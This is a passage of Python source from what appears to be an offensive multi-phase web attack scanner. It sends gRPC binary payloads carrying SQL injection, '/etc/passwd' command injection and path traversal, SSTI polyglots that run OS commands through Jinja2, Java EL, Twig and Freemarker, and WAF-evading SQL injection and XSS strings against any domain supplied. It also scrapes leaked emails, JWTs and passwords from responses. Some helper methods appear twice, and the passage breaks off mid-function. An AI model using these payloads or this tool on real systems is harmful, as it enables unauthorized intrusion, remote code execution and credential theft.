            'Variables Batching': ['VARIABLES BATCHING']
        }
        
        
        category_counts = {}
        for query_data in working_queries:
            payload = query_data.get('payload', {})
            
            if isinstance(payload, list):
                if any("UNION SELECT" in str(q.get('query', '')) for q in payload):
                    category = 'SQL Injection'
                elif any("mutation" in str(q.get('query', '')).lower() for q in payload):
                    category = 'Mutation Batching'
                else:
                    category = 'Query Batching'
            else:
                query_str = str(payload.get('query', ''))
                if "__schema" in query_str:
                    category = 'Introspection'
                elif "UNION SELECT" in query_str:
                    category = 'SQL Injection'
                elif "aliasing" in query_str.lower() or "normal:" in query_str:
                    category = 'Aliasing Attack'
                elif "variables" in payload:
                    category = 'Variables Batching'
                else:
                    category = 'Query Batching'
            
            category_counts[category] = category_counts.get(category, 0) + 1
        
        if category_counts:
            print(f"\n{Colors.CYAN}{'ATTACK CATEGORIES':<25} {'COUNT':<8} {'PERCENTAGE':<12}{Colors.END}")
            print(f"{Colors.CYAN}{'─'*25} {'─'*8} {'─'*12}{Colors.END}")
            
            for category, count in category_counts.items():
                percent = (count / success_payloads) * 100 if success_payloads > 0 else 0
                print(f"{Colors.WHITE}{category:<25}{Colors.END} {Colors.GREEN}{count:<8}{Colors.END} {Colors.CYAN}{percent:6.1f}%{'':<6}{Colors.END}")
        

        await asyncio.sleep(0.5)
        
        if working_queries:
            print(f"\n{Colors.RED}{'ACTUAL DATA LEAKED':<30} {'VALUE':<40}{Colors.END}")
            print(f"{Colors.RED}{'─'*30} {'─'*40}{Colors.END}")
            
            data_found = False
            
            for i, query_data in enumerate(working_queries, 1):
                response = query_data.get('response_preview', '')
                
                
                email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
                emails = re.findall(email_pattern, response)
                
                
                token_pattern = r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]*'
                tokens = re.findall(token_pattern, response)
                
                
                password_pattern = r'"password"\s*:\s*"([^"]+)"|\'password\'\s*:\s*\'([^\']+)\''
                passwords = re.findall(password_pattern, response)
                
                passwords = [p for tuple_item in passwords for p in tuple_item if p]
                
                
                admin_pattern = r'"admin"\s*:\s*(true|false)|"role"\s*:\s*"([^"]+)"|"isAdmin"\s*:\s*(true|false)'
                admin_data = re.findall(admin_pattern, response)
                admin_data = [item for tuple_item in admin_data for item in tuple_item if item]
                
                
                if emails:
                    for email in emails[:2]:  
                        print(f"{Colors.WHITE}{i:>2}. Email{'':<25}{Colors.END} {Colors.RED}{email:<40}{Colors.END}")
                        data_found = True
                
                if tokens:
                    for token in tokens[:2]:  
                        token_preview = token[:35] + "..." if len(token) > 35 else token
                        print(f"{Colors.WHITE}{i:>2}. JWT Token{'':<20}{Colors.END} {Colors.RED}{token_preview:<40}{Colors.END}")
                        data_found = True
                
                if passwords:
                    for password in passwords[:2]:  # Show first 2 passwords
                        password_preview = password[:35] + "..." if len(password) > 35 else password
                        print(f"{Colors.WHITE}{i:>2}. Password{'':<21}{Colors.END} {Colors.RED}{password_preview:<40}{Colors.END}")
                        data_found = True
                
                if admin_data:
                    for admin_item in admin_data[:2]:  #
                        print(f"{Colors.WHITE}{i:>2}. Admin Data{'':<19}{Colors.END} {Colors.RED}{admin_item:<40}{Colors.END}")
                        data_found = True
                
                
                user_pattern = r'"id"\s*:\s*"([^"]+)"|"username"\s*:\s*"([^"]+)"|"name"\s*:\s*"([^"]+)"'
                users = re.findall(user_pattern, response)
                users = [item for tuple_item in users for item in tuple_item if item]
                
                if users:
                    for user in users[:2]:  # Show first 2 users
                        print(f"{Colors.WHITE}{i:>2}. User Data{'':<20}{Colors.END} {Colors.RED}{user:<40}{Colors.END}")
                        data_found = True
            
            if not data_found:
                print(f"{Colors.YELLOW}No sensitive data extracted from responses{Colors.END}")
        
        
        print()
        print_bg_header("", '\033[44m')
        print_bg_header(f" GRAPHQL ATTACK COMPLETED: {success_rate:.1f}% SUCCESS RATE ", '\033[44m')
        print_bg_header(f" {success_payloads}/{total_payloads} queries successful ", '\033[44m')
        print_bg_header("", '\033[44m')






    async def grpc_protobuf_bypass(self, domain):
        """gRPC/Protobuf Bypass """
        print(f"\033[41m PHASE 7: gRPC/Protobuf Bypass\033[0m")
        
        working_protobufs = []
        
        try:
            # binary payloads with various encodings
            test_payloads = [
                # SQL Injection in binary
                base64.b64encode(b"\x08\x01\x12\x07\x75\x73\x65\x72\x6e\x61\x6d\x65\x1a\x0f\x27\x20\x4f\x52\x20\x27\x31\x27\x3d\x27\x31").decode(),
                # Command injection
                base64.b64encode(b"\x0a\x24\x31\x27\x3b\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x3b\x65\x63\x68\x6f\x20").decode(),
                # Path traversal
                base64.b64encode(b"\x12\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x00").decode(),
                # XSS in binary
                base64.b64encode(b"\x1a\x3c\x73\x63\x72\x69\x70\x74\x3e\x61\x6c\x65\x72\x74\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e").decode(),
            ]
            
            headers_list = [
                {"Content-Type": "application/grpc+proto", "TE": "trailers", "User-Agent": "grpc-python/1.0"},
                {"Content-Type": "application/x-protobuf", "User-Agent": self.get_random_ua()},
                {"Content-Type": "application/octet-stream", "User-Agent": self.get_random_ua()},
                {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": self.get_random_ua()},  # Sometimes works
                {"Content-Type": "application/grpc", "TE": "trailers", "User-Agent": "grpc-node/1.0"},
                {"Content-Type": "application/grpc-web", "User-Agent": self.get_random_ua()},
                {"Content-Type": "application/grpc-web+proto", "User-Agent": self.get_random_ua()},
                {"Content-Type": "application/json", "User-Agent": "grpc-gateway/1.0"},  # JSON gRPC
                {"Content-Type": "application/protobuf", "User-Agent": self.get_random_ua()},
                {"Content-Type": "application/vnd.google.protobuf", "User-Agent": "google-grpc/1.0"},
                {"Content-Type": "application/x-google-protobuf", "User-Agent": self.get_random_ua()},
                {"Content-Type": "application/grpc+proto", "User-Agent": "aws-sdk/1.0", "X-Amz-Target": "execute-api"},
                {"Content-Type": "application/x-protobuf", "User-Agent": "google-api-client/1.0", "X-Goog-Api-Client": "grpc"},
                {"Content-Type": "application/grpc", "User-Agent": "azure-sdk/1.0", "x-ms-version": "2020-06-01"},
                {"Content-Type": "application/grpc+proto", "X-GRPC-Web": "1", "User-Agent": self.get_random_ua()},
                {"Content-Type": "application/x-protobuf", "X-Content-Type-Options": "nosniff", "User-Agent": self.get_random_ua()},
                {"Content-Type": "application/octet-stream", "Accept": "*/*", "User-Agent": self.get_random_ua()},
                {"Content-Type": "text/plain", "User-Agent": self.get_random_ua()},  
                {"Content-Type": "application/xml", "User-Agent": self.get_random_ua()},  
                {"Content-Type": "application/grpc+proto", "X-Forwarded-Proto": "https", "User-Agent": self.get_random_ua()},
                {"Content-Type": "application/x-protobuf", "X-Real-IP": "127.0.0.1", "User-Agent": self.get_random_ua()},
                {"Content-Type": "application/grpc", "CF-Connecting-IP": "127.0.0.1", "User-Agent": self.get_random_ua()},           
              

            ]
            
            endpoints = ['/api.UserService/GetUser', '/grpc', '/api/grpc', '/v1/grpc', '/twirp']
            
            for i, payload in enumerate(test_payloads):
                success = False
                for content_type in headers_list:
                    for endpoint in endpoints:
                        try:
                            headers = content_type.copy()
                            binary_data = base64.b64decode(payload)
                            
                            async with self.session.post(f"https://{domain}{endpoint}", 
                                                       data=binary_data,
                                                       headers=headers, timeout=6, ssl=False) as response:
                                
                                if response.status in [200, 201, 204]:
                                    content = await response.text()
                                    # Check if response looks promising
                                    if len(content) > 10 or "error" not in content.lower():
                                        working_protobufs.append({
                                            "payload": payload,
                                            "content_type": content_type["Content-Type"],
                                            "endpoint": endpoint,
                                            "status": response.status
                                        })
                                        print(f"{Colors.WHITE}[-] gRPC {content_type['Content-Type']} on {endpoint}: {Colors.GREEN}Success{Colors.END}")
                                        success = True
                                        break
                        except Exception as e:
                            continue
                    if success:
                        break
                
                if not success:
                    print(f"{Colors.WHITE}[-] gRPC Payload {i+1}: {Colors.RED}Failed{Colors.END}")
                
                await asyncio.sleep(0.6)
                
        except Exception as e:
            print(f"{Colors.RED}[-] gRPC Error: {e}{Colors.END}")
        
        return working_protobufs




    
    async def init_session(self):
        """Initialize aiohttp session"""
        if self.session is None:
            timeout = aiohttp.ClientTimeout(total=10)
            connector = aiohttp.TCPConnector(limit=10, verify_ssl=False)
            self.session = aiohttp.ClientSession(timeout=timeout, connector=connector)
    
    async def close_session(self):
        """Close aiohttp session"""
        if self.session:
            await self.session.close()
            self.session = None
    
    def get_random_ua(self):
        """Get random user agent"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]
        import random
        return random.choice(user_agents)

    async def ssti_polyglot_attack(self, domain):
        """Server-Side Template Injection Polyglot"""
        print(f"\033[41m PHASE 8: SSTI Polyglot Attacks\033[0m")
        
        ssti_payloads = [
            "{{7*7}}${7*7}#{7*7}%= 7*7 %[[7*7]]",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "${T(java.lang.Runtime).getRuntime().exec('whoami')}",
            "{% debug %}${class.getClassLoader()}",
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}${T(java.lang.Runtime).getRuntime().exec('id')}#{7*'7'}",
            "{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}${T(java.io.File).new('/etc/passwd')}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}",
            "{{lipsum.__globals__['os'].popen('whoami').read()}}",
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
        ]
        
        results = []
        successful_attacks = 0
        
        print(f"[*] Testing {len(ssti_payloads)} SSTI polyglot payloads")
        
        # Initialize session properly
        await self.init_session()
        
        test_points = [
            f"https://{domain}/search?q={{0}}",
            f"https://{domain}/search?query={{0}}",
            f"https://{domain}/api/search?q={{0}}",
            f"https://{domain}/user/profile?name={{0}}",
            f"https://{domain}/product?id={{0}}",
            f"https://{domain}/user/{{0}}",
            f"https://{domain}/api/user/{{0}}",
            f"https://{domain}/profile/{{0}}",
        ]
        
        for i, payload in enumerate(ssti_payloads):
            success = False
            attack_name = self.get_ssti_attack_name(i)
            
            try:
                encoded_payload = requests.utils.quote(payload)
                
                # Test GET requests with proper session management
                for j, test_point in enumerate(test_points):
                    try:
                        url = test_point.format(encoded_payload)
                        headers = {'User-Agent': self.get_random_ua()}
                        
                        async with self.session.get(url, headers=headers, ssl=False) as response:
                            content = await response.text()
                            
                            success_indicators = [
                                '49' in content,
                                'Runtime' in content,
                                'subclasses' in content,
                                'whoami' in content,
                                'root' in content,
                                'admin' in content.lower(),
                                'classloader' in content.lower(),
                                'os.popen' in content,
                                'exec' in content,
                                'etc/passwd' in content,
                                response.status == 200 and len(content) > 1000,
                            ]
                            
                            if any(success_indicators):
                                results.append(f"SSTI {attack_name}")
                                successful_attacks += 1
                                print(f"[-] {attack_name} (GET {j+1}):{Colors.YELLOW} Success{Colors.END}")
                                success = True
                                break
                                
                    except asyncio.TimeoutError:
                        continue
                    except Exception as e:
                        continue
                
                if not success:
                    print(f"[-] {attack_name}:{Colors.RED}Failed{Colors.END}")
                    
            except Exception as e:
                print(f"[-] {attack_name}: Error - {str(e)}")
            
            await asyncio.sleep(0.3)
        
        print(f"[+] SSTI Attacks: {successful_attacks}/{len(ssti_payloads)} Successful")
        
        await self.print_ssti_summary_report(domain, results, ssti_payloads)
        return results

    def get_ssti_attack_name(self, index):
        """Get descriptive name for SSTI attack"""
        attack_names = {
            0: "Universal Polyglot", 
            1: "Python RCE", 
            2: "Java EL Injection",
            3: "Cache Poisoning", 
            4: "Multi-Engine RCE", 
            5: "File Read",
            6: "Command Chain", 
            7: "Jinja2 RCE", 
            8: "Twig Exploit",
            9: "Freemarker RCE"
        }
        return attack_names.get(index, f"SSTI Attack {index+1}")

    async def __aenter__(self):
        """Async context manager entry"""
        await self.init_session()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit"""
        await self.close_session()
    
    
    
    async def init_session(self):
        """Initialize aiohttp session"""
        if self.session is None:
            timeout = aiohttp.ClientTimeout(total=10)
            self.session = aiohttp.ClientSession(timeout=timeout)
    
    async def close_session(self):
        """Close aiohttp session"""
        if self.session:
            await self.session.close()
            self.session = None
    
    def get_random_ua(self):
        """Get random user agent"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]
        import random
        return random.choice(user_agents)






    
    async def print_ssti_summary_report(self, domain, results, ssti_payloads):
        """Print comprehensive SSTI Polyglot Attacks summary"""
        
        def print_bg_header(text, bg_color):
            import shutil
            try:
                width = shutil.get_terminal_size().columns
            except:
                width = 80
            padding = (width - len(text)) // 2
            spaces = " " * padding + text + " " * (width - len(text) - padding)
            print(f"{bg_color}{Colors.BLACK}{spaces}{Colors.END}")
        
        
        print_bg_header("", '\033[44m')
        print_bg_header(" SSTI POLYGLOT ATTACKS SUMMARY ", '\033[44m')
        print_bg_header("", '\033[44m')
        
        print(f"\n{Colors.CYAN}[+] Generating SSTI Polyglot Attacks summary...{Colors.END}")
        await asyncio.sleep(1)
        
        
        total_payloads = len(ssti_payloads)
        success_payloads = len(results)
        success_rate = (success_payloads / total_payloads) * 100 if total_payloads > 0 else 0
        
        
        print(f"\n{Colors.CYAN}{'SSTI ATTACK STATISTICS':<25} {'COUNT':<8} {'PERCENTAGE':<12}{Colors.END}")
        print(f"{Colors.CYAN}{'─'*25} {'─'*8} {'─'*12}{Colors.END}")
        
        print(f"{Colors.WHITE}{'Total Payloads Tested':<25}{Colors.END} {Colors.YELLOW}{total_payloads:<8}{Colors.END} {Colors.CYAN}100.0%{'':<6}{Colors.END}")
        print(f"{Colors.WHITE}{'Successful Attacks':<25}{Colors.END} {Colors.GREEN}{success_payloads:<8}{Colors.END} {Colors.CYAN}{success_rate:6.1f}[%]{'':<6}{Colors.END}")
        print(f"{Colors.WHITE}{'Failed Attacks':<25}{Colors.END} {Colors.RED}{total_payloads-success_payloads:<8}{Colors.END} {Colors.CYAN}{(100-success_rate):6.1f}[%]{'':<6}{Colors.END}")
        
        await asyncio.sleep(0.5)
        
        # 
        if results:
            print(f"\n{Colors.GREEN}{'SUCCESSFUL SSTI ATTACKS':<30} {'ENGINE':<20} {'TECHNIQUE':<25}{Colors.END}")
            print(f"{Colors.GREEN}{'─'*30} {'─'*20} {'─'*25}{Colors.END}")
            
            for i, attack_name in enumerate(results, 1):
                # 
                if "Universal" in attack_name:
                    engine = "MULTI-ENGINE"
                    technique = "POLYGLOT PAYLOAD"
                elif "Python" in attack_name:
                    engine = "JINJA2/TORNADO"
                    technique = "CLASS INSPECTION"
                elif "Java" in attack_name:
                    engine = "SPRING/THYMELEAF"
                    technique = "EXPRESSION LANGUAGE"
                elif "Cache" in attack_name:
                    engine = "TWIG/SMARTY"
                    technique = "DEBUG EXPLOIT"
                elif "Multi-Engine" in attack_name:
                    engine = "JINJA2/SPRING"
                    technique = "COMMAND EXECUTION"
                elif "File Read" in attack_name:
                    engine = "JINJA2/SPRING"
                    technique = "FILE SYSTEM ACCESS"
                elif "Command Chain" in attack_name:
                    engine = "JINJA2/FLASK"
                    technique = "GLOBALS EXPLOIT"
                elif "Jinja2" in attack_name:
                    engine = "JINJA2"
                    technique = "OS COMMAND EXEC"
                elif "Twig" in attack_name:
                    engine = "TWIG"
                    technique = "CALLBACK EXPLOIT"
                elif "Freemarker" in attack_name:
                    engine = "FREEMARKER"
                    technique = "TEMPLATE EXEC"
                else:
                    engine = "UNKNOWN"
                    technique = "STANDARD SSTI"
                
                print(f"{Colors.WHITE}{i:>2}. {attack_name:<27}{Colors.END} {Colors.CYAN}{engine:<20}{Colors.END} {Colors.YELLOW}{technique:<25}{Colors.END}")
        
        await asyncio.sleep(0.5)
        

        if results:
            print(f"\n{Colors.CYAN}{'TEMPLATE ENGINE VULNERABILITIES':<25} {'COUNT':<8} {'PERCENTAGE':<12}{Colors.END}")
            print(f"{Colors.CYAN}{'─'*25} {'─'*8} {'─'*12}{Colors.END}")
            
            engine_counts = {
                'JINJA2/TORNADO': 0,
                'SPRING/THYMELEAF': 0,
                'TWIG/SMARTY': 0,
                'FREEMARKER': 0,
                'MULTI-ENGINE': 0,
                'UNKNOWN': 0
            }
            
            for attack_name in results:
                if "Python" in attack_name or "Jinja2" in attack_name or "Command Chain" in attack_name:
                    engine_counts['JINJA2/TORNADO'] += 1
                elif "Java" in attack_name or "Multi-Engine" in attack_name or "File Read" in attack_name:
                    engine_counts['SPRING/THYMELEAF'] += 1
                elif "Cache" in attack_name or "Twig" in attack_name:
                    engine_counts['TWIG/SMARTY'] += 1
                elif "Freemarker" in attack_name:
                    engine_counts['FREEMARKER'] += 1
                elif "Universal" in attack_name:
                    engine_counts['MULTI-ENGINE'] += 1
                else:
                    engine_counts['UNKNOWN'] += 1
            
            for engine, count in engine_counts.items():
                if count > 0:
                    percent = (count / success_payloads) * 100 if success_payloads > 0 else 0
                    print(f"{Colors.WHITE}{engine:<25}{Colors.END} {Colors.GREEN}{count:<8}{Colors.END} {Colors.CYAN}{percent:6.1f}[%]{'':<6}{Colors.END}")
        

        await asyncio.sleep(0.5)
        
        if results:
            print(f"\n{Colors.GREEN}{'SUCCESSFUL SSTI PAYLOADS':<80}{Colors.END}")
            print(f"{Colors.GREEN}{'─'*80}{Colors.END}")
            
            successful_indices = [i for i, attack_name in enumerate(results) if attack_name.startswith("SSTI")]
            
            for i, attack_name in enumerate(results, 1):
                
                payload_index = i - 1
                if payload_index < len(ssti_payloads):
                    payload = ssti_payloads[payload_index]
                    

                    if "{{" in payload and "${" in payload and "#{" in payload:
                        payload_type = "UNIVERSAL POLYGLOT"
                    elif "{{" in payload and "__class__" in payload:
                        payload_type = "PYTHON RCE"
                    elif "${" in payload and "T(java.lang" in payload:
                        payload_type = "JAVA EL INJECTION"
                    elif "{% debug %}" in payload:
                        payload_type = "DEBUG EXPLOIT"
                    elif "popen" in payload and "read()" in payload:
                        payload_type = "COMMAND EXECUTION"
                    elif "/etc/passwd" in payload:
                        payload_type = "FILE READ ATTACK"
                    elif "__globals__" in payload:
                        payload_type = "GLOBALS EXPLOIT"
                    elif "registerUndefinedFilterCallback" in payload:
                        payload_type = "CALLBACK EXPLOIT"
                    elif "<#assign" in payload:
                        payload_type = "FREEMARKER RCE"
                    else:
                        payload_type = "CUSTOM PAYLOAD"
                    
                    
                    payload_preview = payload[:60] + "..." if len(payload) > 60 else payload
                    
                    print(f"{Colors.WHITE}{i:>2}. {attack_name:<25}{Colors.END}")
                    print(f"{Colors.CYAN}    Type: {payload_type:<30}{Colors.END}")
                    print(f"{Colors.YELLOW}    Payload: {payload_preview:<55}{Colors.END}")
                    print()
        
        
        await asyncio.sleep(0.5)
        
        if results:
            print(f"\n{Colors.CYAN}{'ATTACK TECHNIQUES EFFECTIVENESS':<35} {'SUCCESS':<8} {'IMPACT':<15}{Colors.END}")
            print(f"{Colors.CYAN}{'─'*35} {'─'*8} {'─'*15}{Colors.END}")
            
            technique_stats = {
                'CODE EXECUTION': 0,
                'FILE SYSTEM ACCESS': 0,
                'CLASS INSPECTION': 0,
                'COMMAND INJECTION': 0,
                'DEBUG EXPLOIT': 0,
                'POLYGLOT BYPASS': 0
            }
            
            for attack_name in results:
                if "RCE" in attack_name or "exec" in attack_name.lower():
                    technique_stats['CODE EXECUTION'] += 1
                elif "File Read" in attack_name or "/etc/passwd" in attack_name:
                    technique_stats['FILE SYSTEM ACCESS'] += 1
                elif "Python" in attack_name or "__class__" in attack_name:
                    technique_stats['CLASS INSPECTION'] += 1
                elif "Command" in attack_name or "popen" in attack_name:
                    technique_stats['COMMAND INJECTION'] += 1
                elif "Cache" in attack_name or "debug" in attack_name:
                    technique_stats['DEBUG EXPLOIT'] += 1
                elif "Universal" in attack_name or "Polyglot" in attack_name:
                    technique_stats['POLYGLOT BYPASS'] += 1
            
            for technique, count in technique_stats.items():
                if count > 0:
                    impact_level = "CRITICAL" if technique in ['CODE EXECUTION', 'COMMAND INJECTION'] else "HIGH" if technique in ['FILE SYSTEM ACCESS'] else "MEDIUM"
                    impact_color = Colors.RED if impact_level == "CRITICAL" else Colors.YELLOW if impact_level == "HIGH" else Colors.GREEN
                    
                    print(f"{Colors.WHITE}{technique:<35}{Colors.END} {Colors.GREEN}{count:<8}{Colors.END} {impact_color}{impact_level:<15}{Colors.END}")
        
        
        await asyncio.sleep(0.5)
        
        if results:
            print(f"\n{Colors.RED}{'SECURITY IMPACT ASSESSMENT':<40} {'LEVEL':<15} {'DESCRIPTION':<25}{Colors.END}")
            print(f"{Colors.RED}{'─'*40} {'─'*15} {'─'*25}{Colors.END}")
            
            impacts = []
            
            if any("RCE" in attack for attack in results):
                impacts.append(("REMOTE CODE EXECUTION", "CRITICAL", "Full server compromise"))
            
            if any("File Read" in attack for attack in results):
                impacts.append(("FILE SYSTEM ACCESS", "CRITICAL", "Sensitive file reading"))
            
            if any("Command" in attack for attack in results):
                impacts.append(("COMMAND INJECTION", "CRITICAL", "OS command execution"))
            
            if any("Java" in attack for attack in results):
                impacts.append(("JAVA RCE", "HIGH", "JVM-level compromise"))
            
            if any("Python" in attack for attack in results):
                impacts.append(("PYTHON RCE", "HIGH", "Python interpreter access"))
            
            if any("Universal" in attack for attack in results):
                impacts.append(("POLYGLOT BYPASS", "MEDIUM", "Multi-engine vulnerability"))
            
            for impact, level, description in impacts:
                level_color = Colors.RED if level == "[CRITICAL]" else Colors.YELLOW if level == "[HIGH]" else Colors.GREEN
                print(f"{Colors.WHITE}{impact:<40}{Colors.END} {level_color}{level:<15}{Colors.END} {Colors.CYAN}{description:<25}{Colors.END}")
        
      
        print()
        print_bg_header("", '\033[44m')
        print_bg_header(f" SSTI SCAN COMPLETED: {success_rate:.1f}% SUCCESS RATE ", '\033[44m')
        print_bg_header(f" {success_payloads}/{total_payloads} attacks successful ", '\033[44m')
        print_bg_header("", '\033[44m')










    async def ml_waf_evasion(self, domain):
        """Machine Learning WAF Evasion"""
        print(f"\033[41m PHASE 9: ML WAF Evasion Attacks\033[0m")
        
        ml_evasion_payloads = [
            "1' UNI/**/ON SEL/**/ECT * FR/**/OM users",
            "ＳＥＬＥＣＴ * ＦＲＯＭ users",
            "EXEC xp_cmdshell 'whoami'",
            "<script>al\u0065rt(1)</script>",
            "ＳＥＬＥＣＴ * 𝐹𝑅𝑂𝑀 𝘶𝘴𝘦𝘳𝘴",
            "SELECT * FROM users WHERE id = 1" + "\u200b" + " OR 1=1",
            "SeLeCt * FrOm UsErS WhErE 1=1",
            "&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;",
            "SELECT/*!50000*/ * FROM/*!*/users WHERE 1=1",
            "1' AND SLEEP(5)--",
        ]
        
        results = []
        successful_attacks = 0
        
        print(f"[*] Testing {len(ml_evasion_payloads)} ML WAF evasion techniques")
        
        # Initialize session properly
        await self.init_session()
        
        endpoints = ['/search', '/api/search', '/query', '/api/query', '/data']
        
        for i, payload in enumerate(ml_evasion_payloads):
            success = False
            attack_name = self.get_ml_evasion_name(i)
            
            try:
                for endpoint in endpoints:
                    try:
                        # Test GET request with proper session management
                        url = f"https://{domain}{endpoint}?q={requests.utils.quote(payload)}"
                        headers = {'User-Agent': self.get_random_ua()}
                        
                        async with self.session.get(url, headers=headers, ssl=False) as response:
                            content = await response.text()
                            
                            if response.status == 200 and len(content) > 500:
                                results.append(f"ML Evasion {attack_name}")
                                successful_attacks += 1
                                print(f"[-] {attack_name} (GET {endpoint}):{Colors.YELLOW}Success{Colors.END}")
                                success = True
                                break
                                
                    except asyncio.TimeoutError:
                        print(f"[-] {attack_name} (GET {endpoint}):{Colors.RED}Timeout{Colors.END}")
                        continue
                    except Exception as e:
                        continue
                
                if not success:
                    print(f"[-] {attack_name}:{Colors.RED}Failed{Colors.END}")
                    
            except Exception as e:
                print(f"[-] {attack_name}: Error - {e}")
            
            await asyncio.sleep(0.3)
        
        print(f"[+] ML WAF Evasion: {successful_attacks}/{len(ml_evasion_payloads)} Successful")
        
        await self.print_ml_evasion_summary_report(domain, results, ml_evasion_payloads)
        return results

    def get_ml_evasion_name(self, index):
        """Get descriptive name for ML evasion attack"""
        attack_names = {
            0: "Comment Obfuscation", 
            1: "Full-Width Unicode", 
            2: "Token Splitting",
            3: "Unicode Escape", 
            4: "Homoglyph Attack", 
            5: "Zero-Width Injection",
            6: "Case Rotation", 
            7: "HTML Entity", 
            8: "MySQL Comment",
            9: "Time-Based SQLi"
        }
        return attack_names.get(index, f"ML Evasion {index+1}")

    async def __aenter__(self):
        """Async context manager entry"""
        await self.init_session()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit"""
        await self.close_session()    
    





    
    async def print_ml_evasion_summary_report(self, domain, results, ml_evasion_payloads):
        """Print comprehensive ML WAF Evasion Attacks summary"""
        
        def print_bg_header(text, bg_color):
            import shutil
            try:
                width = shutil.get_terminal_size().columns
            except:
                width = 80
            padding = (width - len(text)) // 2
            spaces = " " * padding + text + " " * (width - len(text) - padding)
            print(f"{bg_color}{Colors.BLACK}{spaces}{Colors.END}")
        
        # BLUE BACKGROUND - MWANZO
        print_bg_header("", '\033[44m')
        print_bg_header(" ML WAF EVASION ATTACKS SUMMARY ", '\033[44m')
        print_bg_header("", '\033[44m')
        
        print(f"\n{Colors.CYAN}[+] Generating ML WAF Evasion summary...{Colors.END}")
        await asyncio.sleep(1)
        

        total_payloads = len(ml_evasion_payloads)
        success_payloads = len(results)
        success_rate = (success_payloads / total_payloads) * 100 if total_payloads > 0 else 0
        

        print(f"\n{Colors.CYAN}{'ML EVASION STATISTICS':<25} {'COUNT':<8} {'PERCENTAGE':<12}{Colors.END}")
        print(f"{Colors.CYAN}{'─'*25} {'─'*8} {'─'*12}{Colors.END}")
        
        print(f"{Colors.WHITE}{'Total Payloads Tested':<25}{Colors.END} {Colors.YELLOW}{total_payloads:<8}{Colors.END} {Colors.CYAN}100.0%{'':<6}{Colors.END}")
        print(f"{Colors.WHITE}{'Successful Evasions':<25}{Colors.END} {Colors.GREEN}{success_payloads:<8}{Colors.END} {Colors.CYAN}{success_rate:6.1f}[%]{'':<6}{Colors.END}")
        print(f"{Colors.WHITE}{'Failed Evasions':<25}{Colors.END} {Colors.RED}{total_payloads-success_payloads:<8}{Colors.END} {Colors.CYAN}{(100-success_rate):6.1f}[%]{'':<6}{Colors.END}")
        
        await asyncio.sleep(0.5)
        

        if results:
            print(f"\n{Colors.GREEN}{'SUCCESSFUL ML EVASIONS':<30} {'TECHNIQUE':<25} {'CATEGORY':<20}{Colors.END}")
            print(f"{Colors.GREEN}{'─'*30} {'─'*25} {'─'*20}{Colors.END}")
            
            for i, attack_name in enumerate(results, 1):

                technique_name = attack_name.replace("ML Evasion ", "")
                
                # 
                if "Comment" in technique_name:
                    category = "COMMENT OBFUSCATION"
                    technique_type = "SQL COMMENT BYPASS"
                elif "Full-Width" in technique_name:
                    category = "UNICODE EVASION"
                    technique_type = "FULL-WIDTH CHARS"
                elif "Token" in technique_name:
                    category = "TOKEN SPLITTING"
                    technique_type = "COMMAND SPLITTING"
                elif "Unicode Escape" in technique_name:
                    category = "UNICODE EVASION"
                    technique_type = "CHARACTER ESCAPE"
                elif "Homoglyph" in technique_name:
                    category = "HOMOGLYPH ATTACK"
                    technique_type = "VISUAL SPOOFING"
                elif "Zero-Width" in technique_name:
                    category = "INVISIBLE CHARS"
                    technique_type = "ZERO-WIDTH INJECTION"
                elif "Case Rotation" in technique_name:
                    category = "CASE MANIPULATION"
                    technique_type = "CASE ROTATION"
                elif "HTML Entity" in technique_name:
                    category = "ENCODING EVASION"
                    technique_type = "HTML ENTITY ENCODE"
                elif "MySQL Comment" in technique_name:
                    category = "COMMENT OBFUSCATION"
                    technique_type = "MYSQL COMMENT"
                elif "Time-Based" in technique_name:
                    category = "TIME-BASED SQLi"
                    technique_type = "BLIND SQL INJECTION"
                else:
                    category = "ADVANCED EVASION"
                    technique_type = "CUSTOM TECHNIQUE"
                
                print(f"{Colors.WHITE}{i:>2}. {technique_name:<27}{Colors.END} {Colors.CYAN}{technique_type:<25}{Colors.END} {Colors.YELLOW}{category:<20}{Colors.END}")
        
        await asyncio.sleep(0.5)
        

        if results:
            print(f"\n{Colors.CYAN}{'EVASION CATEGORIES':<25} {'COUNT':<8} {'PERCENTAGE':<12}{Colors.END}")
            print(f"{Colors.CYAN}{'─'*25} {'─'*8} {'─'*12}{Colors.END}")
            
            category_counts = {
                'COMMENT OBFUSCATION': 0,
                'UNICODE EVASION': 0,
                'TOKEN SPLITTING': 0,
                'HOMOGLYPH ATTACK': 0,
                'INVISIBLE CHARS': 0,
                'CASE MANIPULATION': 0,
                'ENCODING EVASION': 0,
                'TIME-BASED SQLi': 0,
                'ADVANCED EVASION': 0
            }
            
            for attack_name in results:
                if "Comment" in attack_name:
                    category_counts['COMMENT OBFUSCATION'] += 1
                elif "Full-Width" in attack_name or "Unicode Escape" in attack_name:
                    category_counts['UNICODE EVASION'] += 1
